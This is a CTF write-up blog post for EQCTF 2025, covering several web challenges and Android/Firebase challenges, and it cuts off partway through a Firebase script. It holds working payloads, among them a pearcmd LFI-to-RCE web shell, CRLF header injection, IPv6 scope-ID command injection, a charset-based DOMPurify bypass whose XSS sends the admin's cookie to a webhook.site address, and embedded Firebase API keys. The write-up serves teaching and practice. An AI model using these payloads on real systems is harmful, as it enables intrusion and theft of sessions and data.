@@ -1,0 +1,1492 @@
+---
+title: 'EQCTF 2025 Writeups'
+description: 'Challenges made by otai, solved by skiddies'
+date: 2025-1-22
+tags: ['writeups']
+image: './EQCTF.png'
+authors: ['aan', 'bakayang', 'weixuan', 'grid']
+---
+
+# Web
+
+## Sourceful Egg
+
+### Analysis
+
+First you need to send a `POST` request with the data `egg` to access inside the `if` block.
+
+```php
+ if (isset($_POST['egg'])) {
+
+    random codes...
+
+} else {
+    echo "You're not even touching the egg...?!!!<br><br>";
+    echo "Anyway, here's a picture of an egg <br><br><img src='img/togepi.gif'>";
+}
+```
+
+Now inside the `if` block there are `two functions` you need to consider.
+
+#### eggSecret Function
+
+```php
+   $secretHash = '00e39786989574093743872279278460'; //can remove the first '0'
+   $eggWorthyStatus = false;
+
+  if (isset($_GET['eggSecret'])) {
+
+        if (md5($_GET['eggSecret']) == $secretHash) { <-- vulnerable condition
+            $eggWorthyStatus = true;
+        } else {
+            $eggWorthyStatus = false;
+        }
+    }
+```
+
+Php is a bit weird, if you encrypt `240610708` with hash.. the result `0e462097431906509019562988736854` will be the same as `0` but it only works in one condition, which is when using `==` operator.
+
+> `md5(240610708) = 0e462097431906509019562988736854 = 0 (when ==)`
+
+So if we are comparing `0e462097431906509019562988736854` and `0e39786989574093743872279278460` with `==` it is technically true because `0 == 0`
+
+#### egg Function
+
+```php
+ $egg = $_POST['egg'];
+
+    if (preg_match("/^(.*?)+$/s", $egg)) { <-- vulnerable condition
+        echo "Find me the egg please";
+    } else {
+        if ($eggWorthyStatus) {
+            echo "You are a true egg connoisseur! Here is your egg flag: " . file_get_contents('flag.txt');
+        } else {
+            echo "Find me the egg please";
+        }
+    }
+```
+
+That `preg_match("/^(.*?)+$/s", $egg)` condition is vulnerable to [ReDoS](https://learn.snyk.io/lesson/redos), to bypass it just spam as many `AAA's` as you can.
+
+### Solve Script
+
+```python
+import requests
+
+url = 'http://135.181.88.229:33722?eggSecret=240610708'
+payload = 'A' * 33009
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Length': str(len(payload))
+}
+
+data = {'egg': payload}
+preg_match("/^(.*?)+$/s", $egg)
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+```
+
+## King Brews
+
+### Analysis
+
+This is blackbox challenge so I can't show you the source code.
+
+If you press any menu, you will be sending `GET` request with the parameter `page` like so:-
+
+http://135.181.88.229:50003/?page=about.php
+
+### Solve Script
+
+To test if the website is vulnerable to LFI, you can try to do the good ol' trick `../../../../`
+
+http://135.181.88.229:50003/?page=../../../../../../etc/passwd
+
+![alt text](./imageEq.png)
+
+If you somehow managed to read the `/etc/passwd` which is a sensitive file that means the website is vulnerable to LFI.
+
+So now, all you need to do is find the flag, the challenge creator actually provided a hint where the flag is located.
+
+![alt text](./imageEq2.png)
+
+If you hover on that button, it redirect to `menu.php`, so let's try to find out how to read `menu.php`
+
+You can actually chain `LFI` to `RCE` if the code allows you to include `php wrapper` in input or if the website has `pearcmd` enabled.
+
+In this case I'm using this method instead [Pearcmd LFI to RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md#lfi-to-rce-via-php-pearcmd)
+
+```python
+import requests
+
+url = "http://135.181.88.229:50003"
+
+r1 = requests.get(f"{url}/?page=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+")
+print(r1.text)
+
+r2 = requests.get(f"{url}/?page=/tmp/exec.php&c=cat+menu.php")
+print(r2.text)
+```
+
+## Secret Access (Unintended)
+
+### Analysis
+
+We need to send both `secret` and `code` parameters using `GET` request.
+
+```php
+ if (!isset($_GET['secret']) || !isset($_GET['code'])) {
+        die("Missing required parameters.");
+    }
+```
+
+Right after that there are couple of `header` request that you need to include to follow the `if` condition requirement.
+
+```php
+if (!isset($_SERVER['HTTP_X_REMOTE_IP']) || $_SERVER['HTTP_X_REMOTE_IP'] !== '127.0.0.1') {
+        die("Something is not quite right...");
+    }
+
+    if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== 'CTF-Challenge-Agent') {
+        die("Something is not quite right...");
+    }
+
+    if (!isset($_SERVER['HTTP_X_AUTH_KEY']) || !is_valid_auth_key($_SERVER['HTTP_X_AUTH_KEY'])) {
+        die("Something is not quite right...");
+    }
+
+    if (is_valid_secret($secret) && is_valid_code($code)) {
+        echo "Not bad! Here is your flag: [REDACTED]";
+    } else {
+        echo "Parameter value incorrect";
+    }
+```
+
+Then, you need to find out how to decode the `secret` value from this function, actually, the intended solution is to do `php type juggling` but I managed to decode everything one by one and `URL Encode` the values lol.
+
+```php
+function is_valid_secret($secret) {
+    $keys1 = [12, 23, 34, 45, 56, 67, 78, 89, 90]; // XOR Keys
+    $keys2 = [91, 82, 73, 64, 55, 46, 37, 28, 19];
+
+    $encoded_parts = [
+        'ND0=', 'Yz0=', 'Ij0=', 'TT0=', 'ZD0=', 'bz0=', 'dz0=', 'cj0=', 'cz0='
+    ];
+
+    $order = [6, 8, 3, 0, 4, 7, 1, 2, 5];
+
+    $decoded_secret = '';
+
+    $reassembled = '';
+    foreach ($order as $index) {
+        $reassembled .= base64_decode($encoded_parts[$index]);
+    }
+
+    for ($i = 0; $i < strlen($reassembled); $i++) {
+        $char = ord($reassembled[$i]) ^ $keys2[$i];
+        $decoded_secret .= chr($char ^ $keys1[$i]);
+    }
+
+    echo $decoded_secret; <-- actually you can just host it locally and get the values straight away (got funny chars so url encode it is better)
+    return strcmp($secret, $decoded_secret) == 0;
+}
+```
+
+The `secret` values you should get `+x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D`.
+
+Next we have `is_valid_code()` function, for this one you need to do `php type juggling` but using empty array, so `code=[]`.
+
+```php
+function is_valid_code($code) {
+    return $code == 0 && $code !== '0' && $code !== 0;
+}
+```
+
+The last function is actually to ensure that the `X-AUTH-KEY` header to have a specific pattern of value
+
+```php
+function is_valid_auth_key($key) {
+    return substr($key, 0, 5) === "auth-" && strlen($key) === 10;
+}
+```
+
+1. `substr($key, 0, 5) === "auth-"` - Must start with exactly "auth-"
+2. `strlen($key) === 10` - Total length must be exactly 10 characters
+
+### Solve Script
+
+```python
+import urllib.request
+
+url = "http://135.181.88.229:33430/?secret=%20x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D&code=[]"
+headers = {
+'User-Agent': 'CTF-Challenge-Agent',
+'X-REMOTE-IP': '127.0.0.1',
+'X-AUTH-KEY': 'auth-12345'
+}
+
+req = urllib.request.Request(url, headers=headers)
+response = urllib.request.urlopen(req)
+print(response.read().decode())
+```
+
+## Vault
+
+### Analysis
+
+When you access the website, there is a input for a `Vault Sequence`. The end goal of the challenge here is for you to insert a valid sequence that will eventually make the `$vault_open` to be `true`.
+
+![](./Website/image1.png)
+
+```php
+<?php
+require('sequence.php');
+ini_set('display_errors', 0);
+
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $vault_open = true;
+    $bankPin = new Sequence();
+    $bankPin->generateVaultRandom();
+
+    $user = $_POST['sequence'] ?? '';
+
+    if (!($base64DecodedSequence = base64_decode($user))) {
+        echo("DANGER ABORTING");
+        die();
+    }
+
+    if (!($validSequence = unserialize($base64DecodedSequence))) {
+        echo("NOT A VALID SEQUENCE");
+        die();
+    }
+
+    if (!($validSequence instanceof Sequence)) {
+        echo "NOT A VALID SEQUENCE";
+        die();
+    }
+
+    for ($x = 0; $x < 10; $x++) {
+        $validSequence->vaultCreds = $bankPin->vaultCreds; //set as bank creds
+    }
+
+    for ($z = 0; $z < 10; $z++) {
+        if ($validSequence->vaultCreds[$z] !== $validSequence->guardCreds[$z]) {
+            $vault_open = false;
+        }
+    }
+
+}
+?>
+```
+
+First step, is to send a `POST` request with the parameter of `sequence`, the value must be encoded in base64, if it is empty it will show the `DANGER ABORTING` output.
+
+```php
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $vault_open = true;
+    $bankPin = new Sequence();
+    $bankPin->generateVaultRandom();
+
+    $user = $_POST['sequence'] ?? '';
+
+    if (!($base64DecodedSequence = base64_decode($user))) {
+        echo("DANGER ABORTING");
+        die();
+    }
+
+    ...
+?>
+```
+
+Here, after decoding it from base64, it will check whether your input is in a form of [php serialization format](https://en.wikipedia.org/wiki/PHP_serialization_format)
+
+```php
+ if (!($validSequence = unserialize($base64DecodedSequence))) {
+        echo("NOT A VALID SEQUENCE");
+        die();
+    }
+
+if (!($validSequence instanceof Sequence)) {
+        echo "NOT A VALID SEQUENCE";
+        die();
+    }
+```
+
+To make a valid php serialization format that is an instance of sequence, we need to follow the `sequence class` that is created inside `sequence.php` as follows.
+
+```php
+class Sequence { // name of class "Sequence" with 8 characters
+    public $vaultCreds; // 1st property with 10 characters
+    public $guardCreds; // 2nd property with 10 characters
+
+    public function generateVaultRandom()
+    {
+        for ($x = 0; $x < 10; $x++) {
+            $randomNumber = random_int(0, 999999999);
+            $this->vaultCreds[] = $randomNumber;
+        }
+    }
+}
+```
+
+_Object Part_
+
+`O:8:"Sequence":2`
+
+- O = Object
+- 8 = Length of class name
+- "Sequence" = Class name
+- 2 = Number of properties
+
+_Sequence Part_
+
+`{s:10:"vaultCreds";a:0:{}s:10:"guardCreds";a:0:{}}`
+
+First property:
+
+- s:10:"vaultCreds" = Property name
+- a:0:{} = Empty array with the size of 10
+
+Second property:
+
+- s:10:"guardCreds" = Property name
+- a:0:{} = Empty array with the size of 10
+
+Combining both parts together now we have a valid sequence!
+`O:8:"Sequence":2{s:10:"vaultCreds";a:0:{}s:10:"guardCreds";a:0:{}}`
+
+Then the value of vaultCreds from `bankPin` object will randomly generated and assigned to the property vaultCreds of `validSequence` object.
+
+```php
+ for ($x = 0; $x < 10; $x++) {
+        $validSequence->vaultCreds = $bankPin->vaultCreds; //set as bank creds
+    }
+```
+
+Lastly, it will compare the values of vaultCreds to guardCreds.
+
+```php
+ for ($z = 0; $z < 10; $z++) {
+        if ($validSequence->vaultCreds[$z] !== $validSequence->guardCreds[$z]) {
+            $vault_open = false;
+        }
+}
+
+```
+
+The exploit here is actually to point the property of guardCreds to vaultCreds, therefore regardless what will happen to the value of vaultCreds, eventually it will always be the same as guardCreds, since guardCreds is pointing to vaultCreds :))
+
+`O:8:"Sequence":2:{s:10:"vaultCreds";a:0:{}s:10:"guardCreds";R:2;}`
+
+> Don't forget to encode it in base64!
+
+## Protecc
+
+### Analysis
+
+This website is running on flask, and at first glance, I thought it is related to XSS since the input looks like it is reflected to the page like so
+
+![](./Website/image2.png)
+
+But upon further research, I guess I was wrong because of Jinja2's autoescaping input which means that any special characters like `<, >, &, ", etc.` will be converted to HTML entities, plus there is no bots in the source code provided.
+
+![](./Website/image3.png)
+
+```python
+return render_template('index.html', protectionName=setName)
+```
+
+```html
+<body class="bg-gray-100 text-black dark:bg-gray-900 dark:text-white">
+  <div class="container mx-auto p-8">
+    <h1 class="mb-4 text-2xl font-bold">Name yo own protection</h1>
+    <form action="/" method="get" class="space-y-4">
+      <div>...</div>
+      <button
+        type="submit"
+        class="rounded-lg bg-blue-500 px-4 py-2 text-center text-base font-semibold text-white shadow-md transition duration-200 ease-in hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-blue-200"
+      >
+        Set Protection
+      </button>
+      {% if protectionName %}
+
+      <div class="mt-4 w-full text-lg font-semibold">
+        Protection set to: {{ protectionName }}
+      </div>
+      {% endif %}
+
+      <div class="mx-auto mt-8">...</div>
+    </form>
+  </div>
+</body>
+```
+
+So let's try to analyze the the `app.py` and see what we can find.
+
+```python
+@app.route('/verifier', methods=['GET'])
+def verifier():
+    # To verify if everything is working as intended
+    input = request.args.get('input', '')
+
+    if input is not None and input != "":
+
+        response = requests.get(f"http://localhost:{port}/?setName=" + input)
+        xssProtection = response.headers.get('X-XSS-Protection')
+        RCEProtection = response.headers.get('Protection-RCE')
+        SecretProtection = response.headers.get('Protection-Secret')
+
+        # While we are it, let's add an admin check too for easy access.
+        adminCheck = response.headers.get('admin')
+
+        print(response.headers)
+
+        if all(header is not None and header != "" for header in [xssProtection, RCEProtection, SecretProtection]) and adminCheck == 'true':
+            return render_template('verifier.html', result="Wow you're an expert in protection! Here's your flag: " + flag)
+
+        return render_template('verifier.html', result="It's secure... I guess...?")
+    else:
+        return render_template('verifier.html', result="Please give me a recipe for the best protection")
+```
+
+So at `/verifier` endpoint, if we want the website to render the flag, we need to send in an `input` which is the value of `setName` parameter, that will eventually make the `server` to give response with these headers:-
+
+1. X-XSS-Protection: 1
+2. Protection-RCE: 1
+3. Protection-Secret: 1
+4. admin: true
+
+Any order is fine, and the value can be anything, EXCEPT for admin, the value must be `true`.
+
+The question here is, is it possible for us to modify the response header to meet the conditions?
+
+Well, thanks to `/` endpoint there is a `default` function that allows us to inject our input to the response headers!
+
+```python
+@app.route('/')
+def default():
+
+    headers = {
+        'X-Content-Type-Options': 'nosniff',
+        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+        'Referrer-Policy': 'no-referrer',
+        'Feature-Policy': "geolocation 'self'; microphone 'none'; camera 'none'",
+    }
+
+    protectionHeader: dict[str, str | bytes] = dict(headers)
+
+    setName = request.args.get('setName', '')
+
+    if filter(setName) == False:
+        return 'Hacking attempt...s?'
+    else:
+        setName = filter(setName)
+
+    if setName is not None and setName != "":
+
+        defaultProtectionValue = "1"
+        protectionHeader['X-XSS-Protection'] = defaultProtectionValue
+        protectionHeader['Protection-' + setName] = defaultProtectionValue
+
+    return render_template('index.html', protectionName=setName), protectionHeader
+```
+
+Let's try to understand it bit by bit. By default, if we send just an `empty string`. These response headers will be included in the output for sure.
+
+```bash
+ headers = {
+        'X-Content-Type-Options': 'nosniff',
+        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+        'Referrer-Policy': 'no-referrer',
+        'Feature-Policy': "geolocation 'self'; microphone 'none'; camera 'none'",
+    }
+```
+
+```bash
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+Date: Mon, 27 Jan 2025 16:53:27 GMT
+X-Content-Type-Options: nosniff <------------ focus from here
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Referrer-Policy: no-referrer
+'Feature-Policy': "geolocation 'self'; microphone 'none'; camera 'none'"
+*anything else that is included by default*
+```
+
+Now if we input any values for `setName`, for example the value `test`, there are 2 more headers pops up in the response headers!
+
+However, only 1 of them meet the conditions, the second response header that is included is not even inside the list of condition :T
+
+1. X-XSS-Protection: 1 ✅
+2. Protection-test: 1 ❌
+
+```bash
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+Date: Mon, 27 Jan 2025 16:58:35 GMT
+X-Content-Type-Options: nosniff <------------ focus from here
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Referrer-Policy: no-referrer
+Feature-Policy: geolocation 'self'; microphone 'none'; camera 'none'
+X-XSS-Protection: 1 <------------ new headers that is included
+Protection-test: 1
+*anything else that is included by default*
+```
+
+So to meet the conditions we were left with 3 more response headers. How do we modify the input so that we can include all of them in the response header?
+
+1. X-XSS-Protection: 1 ✅
+2. Protection-RCE: 1
+3. Protection-Secret: 1
+4. admin: true
+
+Let's try `Protection-RCE: 1` first since it is the easiest, just input `RCE` we don't need to include the values `: 1`, since it is added by default to the last response header that is created.
+
+1. X-XSS-Protection: 1 ✅
+2. Protection-RCE: 1 ✅
+
+```bash
+GET /?setName=RCE HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+Date: Mon, 27 Jan 2025 17:34:14 GMT
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE: 1 ✅
+```
+
+Now to include one more response header lets say `Protection-Secret: 1`, you need to find out how to create a new line in response header. In python/flask it is possible to do that by using `%0d%0a`.
+
+```bash
+GET /?setName=RCE%0d%0aProtection-Secret HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE ❌
+Protection-Secret: 1 ✅
+```
+
+But we can't set its value to `: 1` because... the char `:` is blacklisted :T
+
+```python
+def filter(input):
+    blockedPattern = [':', 'admin', 'true']
+    for pattern in blockedPattern:
+        if pattern in input or pattern.lower() in input or pattern.upper() in input:
+            return False
+    return unquote(input)
+```
+
+To bypass the function just `URL Encode` the blacklisted characters `2 times`. For non-special characters like `admin` can be url encoded by using this [website](https://onlinetexttools.com/url-encode-text) or just create a script on python.
+
+1. ':' will become `%253A`
+2. 'admin' will become `%2561%2564%256D%2569%256E`
+3. 'true' will become `%2574%2572%2575%2565`
+
+```bash
+GET /?setName=RCE%253A%201%0d%0aProtection-Secret HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE: 1 ✅
+Protection-Secret: 1 ✅
+```
+
+And now we are left with the last header which is `admin: true`. As stated before just double url encode it :))
+
+```bash
+GET /?setName=RCE%253A%201%0d%0a%2561%2564%256D%2569%256E%253A%20%2574%2572%2575%2565%0d%0aProtection-Secret HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE: 1 ✅
+admin: true ✅
+Protection-Secret: 1 ✅
+```
+
+Just for your information the payload that we are using right now will only work if we directly put it inside the input form and not at the URL, both input form and URL process the payload differently, for example browsers usually auto-encoding special characters again at the URL. :T
+
+## Ping as a Service
+
+### Analysis
+
+This website is really simple, nothing crazy going on...
+
+```python
+#!/usr/bin/env python3
+import subprocess
+import ipaddress
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'OPTIONS'])
+def ping():
+    user_supplied_IP = request.args.get('IP', '')
+    try:
+        myIPaddress = ipaddress.ip_address(user_supplied_IP)
+    except ValueError:
+        custom_error_msg = 'You supplied an invalid IP address'
+        return render_template('index.html', result=custom_error_msg)
+
+    command_to_execute = f'ping -c 2 {myIPaddress}'
+    print(command_to_execute, flush=True)
+    try:
+        results = subprocess.check_output(['/bin/sh', '-c', command_to_execute], timeout=8)
+        return render_template('index.html', result=results.decode('utf-8'))
+    except subprocess.TimeoutExpired:
+        custom_error_msg = 'Request Timed Out!'
+        return render_template('index.html', result=custom_error_msg)
+    except subprocess.CalledProcessError:
+        custom_error_msg = 'An error occured'
+        return render_template('index.html', result=custom_error_msg)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5004)
+```
+
+At first glance, it looks like the website is vulnerable to `command injection` due to this part of code. It directly uses the `IP` parameter and append it at the end of the command `ping -c 2 {IP here}`.
+
+```python
+def ping():
+    user_supplied_IP = request.args.get('IP', '')
+    try:
+        myIPaddress = ipaddress.ip_address(user_supplied_IP)
+    except ValueError:
+        custom_error_msg = 'You supplied an invalid IP address'
+        return render_template('index.html', result=custom_error_msg)
+
+    command_to_execute = f'ping -c 2 {myIPaddress}'
+    print(command_to_execute, flush=True)
+```
+
+Technically, if I try to send in input like `127.0.0.1; whoami`. It should execute the first command which is to ping `127.0.0.1` and then proceed with the second command `whoami` right..? Welp it doesn't work at all, I keep on getting `You supplied an invalid IP address`.
+
+This is because of the `ipaddress.ipaddress()` function finds out that all of the `IPv4 Address` that we are trying to ping looks funny, in returns, gives us the `ValueError` output.
+
+```python
+myIPaddress = ipaddress.ip_address(user_supplied_IP)
+```
+
+![](./Website/image4.png)
+
+I myself not a fan of reading [docs](https://docs.python.org/3/library/ipaddress.html), but decided to read it again and luckily this time found something suspicious.
+
+> Optionally, the string may also have a scope zone ID, expressed with a suffix %scope_id. If present, the scope ID must be non-empty, and may not contain %. See RFC 4007 for details. For example, fe80::1234%1 might identify address fe80::1234 on the first link of the node.
+
+Therefore, I try to use IPv6 address together with a scope zone ID something like this request `2001:db8::1%1; ls` (without knowing the functionality of it ofc) and somehow it accepts the input together with the command injection payload :))
+
+![](./Website/image5.png)
+
+## Impossible XSS
+
+### Analysis
+
+Looking at the tree structure of the website, I noticed that there is `bot.js`, and inside it there is a `puppeteer` library included, therefore there is a high chance that this challenge is related to `XSS`.
+
+`Puppeteer` is a headless browser automation tool that can simulate real browser interactions. In CTF challenges, it is commonly used to simulate an `admin bot`.
+
+```bash
+.
+├── docker-compose.yml
+├── Dockerfile
+└── app
+   ├── app.js
+   ├── bot.js
+   └── package.json
+
+3 directories, 10 files
+```
+
+This website has 2 endpoints that we can visit
+
+1. `/`
+2. `/report`
+
+At `/` endpoint which is most likely where the `XSS` vulnerability occur because there are no other place where we can `reflect` our input.
+
+```js
+fastify.get('/', (request, reply) => {
+  const userInput = request.query.input || 'Enter your input in /?input=here'
+
+  const window = new JSDOM('').window
+  const DOMPurify = createDOMPurify(window)
+  const clean = DOMPurify.sanitize(userInput)
+  console.log(clean)
+
+  reply.status(200).header('Content-Type', 'text/html').send(clean)
+})
+```
+
+I actually got stuck here for a couple of days because I can't find any payload that can somehow pop an `alert` here because of the `DOMPurify sanitization` function.
+
+Then I start to google information that is related to `DOMPurify bypass` and turns out that the only way for me to pop an alert is by finding `0 day` for that specific library 💀.
+
+#### DOMPurify Misconfig
+
+I find that really impossible so I start digging for more information and come across [this article by Seokchan Yoon](https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities/).
+
+Turns out there is actually a possibility to bypass `DOMPurify` _ONLY IF_ the developer misused/misconfigured the function.
+
+But again if you take a look at the source code, it is way too simple that you couldn't even find out what is misconfigured :T
+
+```js
+const window = new JSDOM('').window
+const DOMPurify = createDOMPurify(window)
+const clean = DOMPurify.sanitize(userInput)
+console.log(clean)
+
+reply.status(200).header('Content-Type', 'text/html').send(clean)
+```
+
+So I started asking for hint:-
+
+1. Is it related to mXSS?
+
+![](./Website/image7.png)
+
+2. Which then lead to another hint :)
+
+![](./Website/image8.png)
+
+#### Content Type Header Exploit
+
+If you take a look at this code snippet right here, the `Content-Type` is actually missing something, which is `charset` initialization.
+
+```js
+reply.status(200).header('Content-Type', 'text/html').send(clean)
+```
+
+```bash
+GET /?input=test HTTP/1.1
+
+HTTP/1.1 200 OK
+content-type: text/html
+```
+
+Usually it is set to `UTF-8`, but lucky for us here the developer forgot to set it, therefore we can use any type of `encoding` we want to break the `HTML` context.
+
+We can try to replicate this brilliant example here by [Stefan Schiller](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context).
+
+```bash
+GET /?input=<img alt="test1"><img alt="test2">
+```
+
+![](./Website/image9.png)
+
+So technically our payload here isn't breaking any rules of `DOMPurify` so it will not sanitize anything.
+
+To change the charset from `ASCII / ISO-2022-JP` (on default) to something else like `JIS X 0208 1978` we need to use the `escape sequence` which is url encoded like-so `%1B`, following with a specific value `$@` to make the browser 'sniff' and decode all bytes with `JIS X 0208 1978`. So combine both of them it will be like this `%1B$@`.
+
+Now what we can do here is insert the `escape sequence` inside the `alt` attribute value just to see if it managed to break the `HTML context`.
+
+```bash
+GET /?input=<img alt="%1B$@">
+```
+
+As you can see here it definitely did, even the `DOMPurify` can't sanitize this payload, by right it should've enclosed the `img` tag like so `<img alt="%1B$@">`. However, the escape sequence value ends up consuming both the `closing double quote` and the `closing angle bracket`.
+
+![](./Website/image11.png)
+
+We are getting close, so now we need to change the charset from `JIS X 0208 1978` back to `ASCII / ISO-2022-JP` using this `escape sequence`, `%1B` followed with this value `(B`, to enable us to inject the rest of the `ASCII` payload in this case we will be using `onerror` attribute to pop an `alert`.
+
+```bash
+GET /?input=<img alt="%1B$@">%1B(B<img alt=" src=x onerror=alert('yo')//">
+```
+
+Let me explain the second part of the payload `%1B(B<img alt=" src=x onerror=alert('yo')//">`
+
+1. `%1B(B` - to 'sniff' the browser back to `ASCII / ISO-2022-JP`
+2. `alt="` - why alt with one tag? because to `enclose` the `consumed double quotes` from the previous `escape sequence` trick
+3. `src=x` - intentionally fires the `onerror` attribute after since x is `invalid` url/image
+4. `onerror=alert('yo')` - pop an alert box :)
+5. `//` - is used to comment out the rest of the payload because, the first image tag is not closed
+6. `"` - is used to close the second image `alt` attribute values
+7. `>` - to close the rest of second `img` tag
+
+Finally, it works!
+
+![](./Website/image12.png)
+
+#### Solve Script
+
+Now steal the cookie from admin by reporting the payload to `/report` endpoint by using `webhook`.
+
+```bash
+POST /report HTTP/1.1
+Host: localhost:7888
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 236
+Cookie: PHPSESSID=7rp218t2ljq7ni76inbto66cv1
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+url=%3Cimg+alt%3D%22%251B%24%40%22%3E%251B%28B+%3Cimg+alt%3D%22src%3Dx+onerror%3D%27fetch%28%60https%3A%2F%2Fwebhook.site%2F030e0794-2b99-41c3-96e6-b920e2f5634c%3Fc%3D%24%7BencodeURIComponent%28document.cookie%29%7D%60%29%27%2F%2F%22%3E
+```
+
+#### References
+
+1. https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities
+2. https://x.com/kevin_mizu/status/1733086824518787473
+3. https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/#technique-2-breaking-html-context
+4. https://x.com/terjanq/status/1876654801397911931
+
+# Mobile
+
+## Who's that Pukimon
+
+First off, try to get the source code of the apk by either `unzipping` normally or you can use `MobSF Framework`.
+
+Analyzing the source codes, there are 7 potential activities files
+
+1. **_io.eqctf.pukimon.MainActivity_**
+2. com.google.firebase.auth.internal.GenericIdpActivity
+3. com.google.firebase.auth.internal.RecaptchaActivity
+4. androidx.credentials.playservices.HiddenActivity
+5. com.google.android.gms.auth.api.signin.internal.SignInHubActivity
+6. com.google.android.gms.common.api.GoogleApiActivity
+7. com.google.android.play.core.common.PlayCoreDialogWrapperActivity
+
+By looking at the names `io.eqctf.pukimon.MainActivity` is definitely the MainActivity file and apart from that `com.google.firebase.auth.internal.GenericIdpActivity` and `com.google.firebase.auth.internal.RecaptchaActivity` gives us a clear view that this apk is using `Firebase` as its database.
+
+### Content of MainActivityKt.java
+
+So this file can be found inside `io.eqctf.pukimon.MainActivity`, I prompted it to gpt cuz I'm bad at reading code.
+
+This function here checks if our input converted to hex matches the value `5368726f6f6d6973686965`.
+
+> Convert Hex to ASCII
+> 5368726f6f6d6973686965 == Shroomishie
+
+```java
+private static final boolean a(String str) {
+    byte[] bytes = str.getBytes(Charsets.UTF_8);
+    if (Intrinsics.areEqual(ArraysKt.joinToString$default(bytes, "", null, null, 0, null,
+        new Function1() {
+            public final Object invoke(Object obj) {
+                return MainActivityKt.a$lambda$3(((Byte) obj).byteValue());
+            }
+        }, 30, null), "5368726f6f6d6973686965")) {
+        return true;
+    }
+    return false;
+}
+```
+
+When correctly guessed, it logs the flag, you can retrieve the value either by reading the `source code` or by using `adb logcat` command.
+
+```java
+byte[] decode = Base64.decode("AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9", 0);
+Log.d("Flag", "Congratz on guessing the pokemon: ".concat(new String(decode, Charsets.UTF_8)));
+```
+
+## Capture that Pukimon
+
+This challenge you need to intercept the request that the mobile is making to `Firebase`. How do I know that it is making some kind of communication to `Firebase`?
+
+Inside the same file if your input is correct which is `Shroomishie` it will take that input and use it as a path to fetch data from `Firebase`
+
+```java
+private static final boolean a(String str, final Function1<? super String, Unit> function1) {
+    DatabaseReference reference = FirebaseDatabase.getInstance().getReference(str);
+    Intrinsics.checkNotNullExpressionValue(reference, "getReference(...)");
+    Task<DataSnapshot> task = reference.get();
+    // ... event handlers for success/failure
+}
+```
+
+So to intercept the communication just use proxy tools like `Burp Suite` or `HTTPToolkit` but you need to remember... that the traffic is using `websocket` and not `HTTP`.
+
+As you can see here there is a `GET` request to `s-usc1f-nss-2568.firebaseio.com `, just take a look at the responses, the flag is in one of em.
+
+![alt text](./imageEq3.png)
+
+## Cook that Pukimon
+
+Lastly if you use apktool to decompile the apk, you noticed that there is `strings.xml` inside `res/values`.
+
+If you take a look inside it, there are a couple of `sensitive` information inside it.
+
+```xml
+<string name="gcm_defaultSenderId">402409561826</string>
+<string name="google_api_key">AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss</string>
+<string name="google_app_id">1:402409561826:android:e9d44b894477f95e6f88bb</string>
+<string name="google_crash_reporting_api_key">AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss</string>
+<string name="google_storage_bucket">eqctf-pukimon1.firebasestorage.app</string>
+```
+
+Now for this part I need refer to someone else [writeups](https://medium.com/@AhmedMhesham/ascwg-ctf-2024-android-challenges-solution-source-code-8c57ffccdcd2) to understand how to connect to `Firebase` since I have no experience in using it. Inside the article there is a dart script that will be able to extract informations from the database.
+
+Here is my own script, I prefer to use JS instead.
+
+```js
+const { initializeApp } = require('firebase/app')
+const { getDatabase, ref, get } = require('firebase/database')
+const { getAuth, signInAnonymously } = require('firebase/auth')
+
+const firebaseConfig = {
+  apiKey: 'AIzaSyBKr-_5vWCd4wT0Q9W50vWtaA7meeCYcss',
+  authDomain: 'eqctf-pukimon1.firebaseapp.com',
+  databaseURL: 'https://eqctf-pukimon1-default-rtdb.firebaseio.com',
+  projectId: 'eqctf-pukimon1',
+  storageBucket: 'eqctf-pukimon1.firebasestorage.app',
+  messagingSenderId: '402409561826',
+  appId: '1:402409561826:android:e9d44b894477f95e6f88bb',
+}
+
